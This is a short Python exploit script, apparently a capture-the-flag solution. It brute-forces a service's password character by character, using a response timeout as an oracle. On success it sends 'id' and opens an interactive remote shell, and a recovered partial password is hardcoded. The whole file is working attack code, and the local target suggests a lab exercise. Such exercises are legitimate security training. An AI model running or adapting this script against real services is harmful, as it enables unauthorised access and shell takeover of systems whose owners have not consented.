# ** Bruteforce password **
# The password does not change, we can use the "WRONG PASSWORD" message as an oracle

import socket , string, time

class MySocket(socket.socket):
    def sendline(self, b):
        return self.send(b + b"\n")

def connect():
    s = MySocket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(0.3)
    s.connect(('0.0.0.0', 4091));
    return s

def check_banner(s):
    banner = s.recv(1024).decode()
    if not "Password" in banner:
        print("[!] Server not responding.")
        exit(1)

def dumb_interactive(s):
    while True:
        _in = input("$ ").encode()
        s.sendline(_in)
        if _in == b"exit":
            break
        while True:
            try:
                _out = s.recv(1024)
                print(_out.decode(),end="")
            except TimeoutError:
                break

alphabet = string.printable.encode()
passw = b"U6pyn4b5DVhJdbyTD7fOBlnyxkSozcT"
#passw = b""

if __name__ == '__main__':
    while True:
        saved_passw = passw 
        for c in alphabet:
            time.sleep(0.05)

            s = connect()
            check_banner(s)

            s.send(passw + bytes([c]))
            try:
                res = s.recv(1024)
            except TimeoutError:
                passw += bytes([c])
                print("\r" + passw.decode(), end="")

                s.send(b"id\n")
                res = s.recv(1024)
                if b"uid=" in res:
                    print("\n[+] Shell")
                    dumb_interactive(s)
                    exit(0)

                s.close()
                break
        if passw == saved_passw:
            print("[!] Failed.")
            break


